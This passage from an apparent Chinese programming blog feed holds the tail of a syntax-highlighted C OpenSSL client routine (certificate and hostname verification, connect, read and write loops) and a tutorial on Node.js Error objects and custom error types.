<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> fprintf(stderr, <span style="color: #8abeb7;">"set recv timeout failed: %s"</span>, strerror(errno));
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> close(sock);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">return</span> -1;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> }

<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; font-style: italic;">/* </span><span style="color: #969896; font-style: italic;">&#22522;&#20110; ctx &#20135;&#29983;&#19968;&#20010;&#26032;&#30340; SSL </span><span style="color: #969896; font-style: italic;">*/</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> *ctx = SSL_CTX_new(SSLv23_client_method());
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">if</span> (<span style="color: #81a2be;">NULL</span> == *ctx) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> fprintf(stderr, <span style="color: #8abeb7;">"new ssl ctx failed"</span>);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> ERR_print_errors_fp(stderr);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> close(sock);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">return</span> -1;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> }

<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; font-style: italic;">/* </span><span style="color: #969896; font-style: italic;">&#21551;&#29992;&#33258;&#21160;&#37325;&#26032;&#25569;&#25163;&#65292;&#31105;&#27490;SSL_read&#25110;SSL_write&#22240;SSL&#37325;&#26032;&#25569;&#25163;&#25552;&#21069;&#36820;&#22238;&#65292;&#23548;&#33268;&#26080;&#27861;&#21306;&#20998;&#26159;&#21542;&#20026;recv&#36229;&#26102;.</span>
<span style="color: #969896; background-color: #22a224a427a7; font-style: italic;"> </span><span style="color: #969896; font-style: italic;"> </span><span style="color: #969896; background-color: #22a224a427a7; font-style: italic;"> </span><span style="color: #969896; font-style: italic;">*/</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">if</span> (<span style="color: #81a2be;">!</span>(SSL_CTX_set_mode(*ctx, SSL_MODE_AUTO_RETRY) &amp; SSL_MODE_AUTO_RETRY)) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> fprintf(stderr, <span style="color: #8abeb7;">"set ssl auto retry mode failed"</span>);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> ERR_print_errors_fp(stderr);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> close(sock);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">return</span> -1;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> }

<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; font-style: italic;">/* </span><span style="color: #969896; font-style: italic;">&#39564;&#35777;&#26381;&#21153;&#22120;&#39564;&#20070; </span><span style="color: #969896; font-style: italic;">*/</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">if</span> (verify_host) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">if</span> (<span style="color: #81a2be;">!</span>SSL_CTX_load_verify_locations(*ctx, SSL_CLIENT_CAFILE,
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span>SSL_CLIENT_CAPATH)) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> fprintf(
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> stderr,
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #8abeb7;">"failed to load certificate verify locations. CAfile(%s) CApath(%s)"</span>,
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> SSL_CLIENT_CAFILE, SSL_CLIENT_CAPATH);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> ERR_print_errors_fp(stderr);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> close(sock);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">return</span> -1;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> }

<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; font-style: italic;">/* </span><span style="color: #969896; font-style: italic;">&#39564;&#35777;&#26381;&#21153;&#22120;&#20027;&#26426;&#21517;&#31216;&#65292;&#21442;&#32771;&#65306;https://wiki.openssl.org/index.php/Hostname_validation</span>
<span style="color: #969896; background-color: #22a224a427a7; font-style: italic;"> </span><span style="color: #969896; font-style: italic;"> </span><span style="color: #969896; background-color: #22a224a427a7; font-style: italic;"> </span><span style="color: #969896; font-style: italic;"> </span><span style="color: #969896; background-color: #22a224a427a7; font-style: italic;"> </span><span style="color: #969896; font-style: italic;">*/</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">X509_VERIFY_PARAM</span>* <span style="color: #f0c674;">param</span> = SSL_CTX_get0_param(*ctx);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; font-style: italic;">/*</span>
<span style="color: #969896; background-color: #22a224a427a7; font-style: italic;"> </span><span style="color: #969896; font-style: italic;"> </span><span style="color: #969896; background-color: #22a224a427a7; font-style: italic;"> </span><span style="color: #969896; font-style: italic;"> </span><span style="color: #969896; background-color: #22a224a427a7; font-style: italic;"> </span><span style="color: #969896; font-style: italic;"> X509_CHECK_FLAG_NO_PARTIAL_WILDCARDS &#36873;&#39033;&#20250;&#23548;&#33268; Hostname mismatch</span>
<span style="color: #969896; background-color: #22a224a427a7; font-style: italic;"> </span><span style="color: #969896; font-style: italic;"> </span><span style="color: #969896; background-color: #22a224a427a7; font-style: italic;"> </span><span style="color: #969896; font-style: italic;"> </span><span style="color: #969896; background-color: #22a224a427a7; font-style: italic;"> </span><span style="color: #969896; font-style: italic;"> &#38169;&#35823;&#65292;&#27880;&#25481;&#20808; X509_VERIFY_PARAM_set_hostflags(param,</span>
<span style="color: #969896; background-color: #22a224a427a7; font-style: italic;"> </span><span style="color: #969896; font-style: italic;"> </span><span style="color: #969896; background-color: #22a224a427a7; font-style: italic;"> </span><span style="color: #969896; font-style: italic;"> </span><span style="color: #969896; background-color: #22a224a427a7; font-style: italic;"> </span><span style="color: #969896; font-style: italic;"> X509_CHECK_FLAG_NO_PARTIAL_WILDCARDS);</span>
<span style="color: #969896; background-color: #22a224a427a7; font-style: italic;"> </span><span style="color: #969896; font-style: italic;"> </span><span style="color: #969896; background-color: #22a224a427a7; font-style: italic;"> </span><span style="color: #969896; font-style: italic;"> </span><span style="color: #969896; font-style: italic;">*/</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> X509_VERIFY_PARAM_set1_host(param, verify_host, 0);

<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> SSL_CTX_set_verify(*ctx, SSL_VERIFY_PEER, <span style="color: #81a2be;">NULL</span>);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> }

<span style="color: #969896; background-color: #22a224a427a7;"> </span> *ssl = SSL_new(*ctx);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">if</span> (<span style="color: #81a2be;">NULL</span> == *ssl) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> fprintf(stderr, <span style="color: #8abeb7;">"new ssl failed"</span>);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> ERR_print_errors_fp(stderr);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> SSL_CTX_free(*ctx);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> *ctx = <span style="color: #81a2be;">NULL</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> close(sock);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">return</span> -1;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> }

<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">if</span> (1 != SSL_set_fd(*ssl, sock)) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> fprintf(stderr, <span style="color: #8abeb7;">"set ssl fd failed"</span>);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> ERR_print_errors_fp(stderr);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> SSL_free(*ssl);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> *ssl = <span style="color: #81a2be;">NULL</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> SSL_CTX_free(*ctx);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> *ctx = <span style="color: #81a2be;">NULL</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> close(sock);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">return</span> -1;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> }

<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; font-style: italic;">/* </span><span style="color: #969896; font-style: italic;">&#24314;&#31435; SSL &#36830;&#25509; </span><span style="color: #969896; font-style: italic;">*/</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">int</span> <span style="color: #f0c674;">ret</span> = SSL_connect(*ssl);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">if</span> (ret &lt;= 0) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">char</span> <span style="color: #f0c674;">error</span>[128] = {<span style="color: #8abeb7;">'\0'</span>};
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> ERR_error_string_n(ERR_get_error(), error, <span style="color: #b5bd68;">sizeof</span>(error));
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> fprintf(stderr, <span style="color: #8abeb7;">"ssl connect to %s:%d failed(%d) error(%s) errno(%d)"</span>,
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> ip_string, port, SSL_get_error(*ssl, ret), error, errno);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">if</span> (verify_host) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">long</span> <span style="color: #f0c674;">verify_result</span> = SSL_get_verify_result(*ssl);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">if</span> (verify_result != X509_V_OK) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> fprintf(stderr, <span style="color: #8abeb7;">"ssl certificate error(%s)"</span>,
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> X509_verify_cert_error_string(verify_result));
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> }
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> }
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> SSL_free(*ssl);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> *ssl = <span style="color: #81a2be;">NULL</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> SSL_CTX_free(*ctx);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> *ctx = <span style="color: #81a2be;">NULL</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> close(sock);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">return</span> -1;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> }

<span style="color: #969896; background-color: #22a224a427a7;"> </span> fprintf(stderr, <span style="color: #8abeb7;">"ssl connect to %s:%d success"</span>, ip_string, port);

<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">return</span> sock;
}

<span style="color: #81a2be;">int</span> <span style="color: #de935f;">ssl_client_read</span>(<span style="color: #81a2be;">SSL</span>* <span style="color: #f0c674;">ssl</span>, <span style="color: #81a2be;">char</span>* <span style="color: #f0c674;">data</span>, <span style="color: #81a2be;">uint32_t</span> <span style="color: #f0c674;">nbytes</span>, <span style="color: #81a2be;">uint32_t</span> <span style="color: #f0c674;">timeout</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">int</span> <span style="color: #f0c674;">readed</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">int</span> <span style="color: #f0c674;">remaining</span> = nbytes;

<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">while</span> (remaining) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> readed = SSL_read(ssl, data + (nbytes - remaining), remaining);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">if</span> (readed &lt;= 0) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> fprintf(stderr, <span style="color: #8abeb7;">"ssl read error(%d) readed(%d) errno(%d)"</span>,
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> SSL_get_error(ssl, readed), readed, errno);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">return</span> -1;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> }
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> remaining -= readed;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> }

<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">return</span> 0;
}

<span style="color: #81a2be;">int</span> <span style="color: #de935f;">ssl_client_write</span>(<span style="color: #81a2be;">SSL</span>* <span style="color: #f0c674;">ssl</span>, <span style="color: #81a2be;">char</span>* <span style="color: #f0c674;">data</span>, <span style="color: #81a2be;">uint32_t</span> <span style="color: #f0c674;">nbytes</span>, <span style="color: #81a2be;">uint32_t</span> <span style="color: #f0c674;">timeout</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">int</span> <span style="color: #f0c674;">writed</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">int</span> <span style="color: #f0c674;">remaining</span> = nbytes;

<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">while</span> (remaining) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> writed = SSL_write(ssl, data + (nbytes - remaining), remaining);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">if</span> (writed &lt;= 0) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> fprintf(stderr, <span style="color: #8abeb7;">"ssl write error(%d) writed(%d) errno(%d)"</span>,
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> SSL_get_error(ssl, writed), writed, errno);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">return</span> -1;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> }
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> remaining -= writed;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> }

<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">return</span> 0;
}
</pre>
</div>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[理解node.js中的Error对象]]></title>
            <link>/article/740689e3-node.js-4e2d7684-error-5bf98c61.html</link>
            <guid>/article/740689e3-node.js-4e2d7684-error-5bf98c61.html</guid>
            <pubDate>Tue, 09 Dec 2014 05:38:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
Error对象在 <a href="http://nodejs.org">node.js</a> 程序中无处不在，但是关于它在 <a href="http://nodejs.org/docs/latest/api/all.html">node.js文档</a> （写这篇文章时node.js的最新版本为v0.10.33）中却找不到描述资料，只在以下部分提及：
</p>

<dl class="org-dl">
<dt><a href="http://nodejs.org/docs/latest/api/all.html#all_util_iserror_object">util.isError(object)</a></dt><dd>判断对象是否为Error对象.</dd>

<dt><a href="http://nodejs.org/docs/latest/api/all.html#all_additions_to_error_objects">Domain: Additions to Error objects</a></dt><dd>在Error对象上附加额外的字段.</dd>
</dl>

<div id="outline-container-org70f2e69" class="outline-2">
<h2 id="org70f2e69">Error到底是何方神圣？</h2>
<div class="outline-text-2" id="text-org70f2e69">
<p>
Error对象是在ECMAScript 5.1（于2011年7月发布）中 <a href="http://www.ecma-international.org/ecma-262/5.1/#sec-15.11">定义</a> 的，是一个比较新的特性：
</p>

<blockquote>
<p>
Instances of Error objects are thrown as exceptions when runtime errors occur. The Error objects may also serve as base objects for user-defined exception classes.
</p>
</blockquote>

<p>
它只有两个属性：
</p>

<dl class="org-dl">
<dt>name</dt><dd>错误名称，默认为"Error"</dd>

<dt>message</dt><dd>错误消息，默认为""</dd>
</dl>

<p>
V8实现了一个扩展属性：
</p>

<dl class="org-dl">
<dt>stack</dt><dd>错误描述及调用堆栈</dd>
</dl>

<p>
它只有一个方法：
</p>

<dl class="org-dl">
<dt>toString</dt><dd>转成字符串形式，通常为 "name: message"</dd>
</dl>

<p>
构造一个Error实例：
</p>

<p>
new Error(message) 或者 Error(message)，两者是一样的。
</p>

<p>
示例：显示错误消息
</p>

<div class="org-src-container">
<pre class="src src-js">console.log(err);
console.log(err.toString());
console.log(err.message);
</pre>
</div>

<p>
需要注意的是console.log(JSON.stringify(err))显示的是空对象{}.
</p>

<p>
示例：显示错误消息及调用堆栈
</p>

<div class="org-src-container">
<pre class="src src-js">console.log(err.stack);
</pre>
</div>

<p>
示例：显示错误名称
</p>

<div class="org-src-container">
<pre class="src src-js">console.log(err.name);
</pre>
</div>
</div>
</div>

<div id="outline-container-org7740e95" class="outline-2">
<h2 id="org7740e95">如何自定义Error类型？</h2>
<div class="outline-text-2" id="text-org7740e95">
<div class="org-src-container">
<pre class="src src-js"><span style="color: #b5bd68;">function</span> <span style="color: #de935f;">MyError</span>(<span style="color: #f0c674;">message</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">this</span>.message = message || <span style="color: #8abeb7;">''</span>;
}

MyError.<span style="color: #81a2be;">prototype</span> = <span style="color: #b5bd68;">new</span> <span style="color: #81a2be;">Error</span>();
MyError.<span style="color: #81a2be;">prototype</span>.constructor = MyError;
MyError.<span style="color: #81a2be;">prototype</span>.name = <span style="color: #8abeb7;">'MyError'</span>;
</pre>
</div>

<p>
Error实例类型判断
</p>

<div class="org-src-container">
<pre class="src src-js"><span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">err</span> = <span style="color: #b5bd68;">new</span> <span style="color: #81a2be;">Error</span>(<span style="color: #8abeb7;">"this is error"</span>);
<span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">myerr</span> = <span style="color: #b5bd68;">new</span> <span style="color: #81a2be;">MyError</span>(<span style="color: #8abeb7;">"this is my error"</span>);
err <span style="color: #b5bd68;">instanceof</span> <span style="color: #81a2be;">Error</span> <span style="color: #969896; font-style: italic;">/*</span><span style="color: #969896; font-style: italic;">true*/</span>
err <span style="color: #b5bd68;">instanceof</span> <span style="color: #81a2be;">MyError</span> <span style="color: #969896; font-style: italic;">/*</span><span style="color: #969896; font-style: italic;">false*/</span>
myerr <span style="color: #b5bd68;">instanceof</span> <span style="color: #81a2be;">MyError</span> <span style="color: #969896; font-style: italic;">/*</span><span style="color: #969896; font-style: italic;">true*/</span>
myerr <span style="color: #b5bd68;">instanceof</span> <span style="color: #81a2be;">Error</span> <span style="color: #969896; font-style: italic;">/*</span><span style="color: #969896; font-style: italic;">true*/</span>
</pre>
</div>

<p>
stack输出有问题：自定义的错误描述没了
</p>

<div class="org-src-container">
<pre class="src src-js">err.stack <span style="color: #969896; font-style: italic;">/*</span><span style="color: #969896; font-style: italic;">'Error: this is error\n    at repl:1:11 ...*/</span>
myerr.stack <span style="color: #969896; font-style: italic;">/*</span><span style="color: #969896; font-style: italic;">'MyError\n    at repl:1:21 ...*/</span>
</pre>
</div>

<p>
修复node.js下MyError的stack不正确的问题
</p>

<div class="org-src-container">
<pre class="src src-js"><span style="color: #b5bd68;">function</span> <span style="color: #de935f;">MyError</span>(<span style="color: #f0c674;">message</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span> Error.captureStackTrace(<span style="color: #81a2be;">this</span>, <span style="color: #81a2be;">this</span>.constructor)
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">this</span>.message = message || <span style="color: #8abeb7;">''</span>;
}

MyError.<span style="color: #81a2be;">prototype</span> = <span style="color: #b5bd68;">new</span> <span style="color: #81a2be;">Error</span>();
MyError.<span style="color: #81a2be;">prototype</span>.constructor = MyError;
MyError.<span style="color: #81a2be;">prototype</span>.name = <span style="color: #8abeb7;">'MyError'</span>;
</pre>
</div>

<p>
<b>最终版：更node.js化一些</b>
</p>

<div class="org-src-container">
<pre class="src src-js"><span style="color: #b5bd68;">function</span> <span style="color: #de935f;">MyError</span>(<span style="color: #f0c674;">message</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span> (!(<span style="color: #81a2be;">this</span> <span style="color: #b5bd68;">instanceof</span> <span style="color: #81a2be;">MyError</span>)) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">return</span> <span style="color: #b5bd68;">new</span> <span style="color: #81a2be;">MyError</span>(message);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   }
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   Error.captureStackTrace(<span style="color: #81a2be;">this</span>, <span style="color: #81a2be;">this</span>.constructor)
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #81a2be;">this</span>.message = message || <span style="color: #8abeb7;">''</span>;
}

util.inherits(MyError, Error)
MyError.<span style="color: #81a2be;">prototype</span>.name = <span style="color: #8abeb7;">'MyError'</span>;
</pre>
</div>
</div>
</div>

<div id="outline-container-orgfb895ad" class="outline-2">
<h2 id="orgfb895ad">参考</h2>
<div class="outline-text-2" id="text-orgfb895ad">
<dl class="org-dl">
<dt><a href="https://docs.nodejitsu.com/articles/errors/what-is-the-error-object">What is the error object?</a></dt><dd>对Error对象的成员有所提及，但与当前的node.js版本不一致。</dd>

<dt><a href="https://cnodejs.org/topic/52090bc944e76d216af25f6f">Node.js下自定义错误类型</a></dt><dd>教你如何自定义错误类型。</dd>

<dt><a href="http://stackoverflow.com/questions/10624873/what-properties-does-nodejs-expresss-error-object-exposes">What properties does nodejs express's Error object exposes?</a></dt><dd>讨论Error对象相关属性</dd>

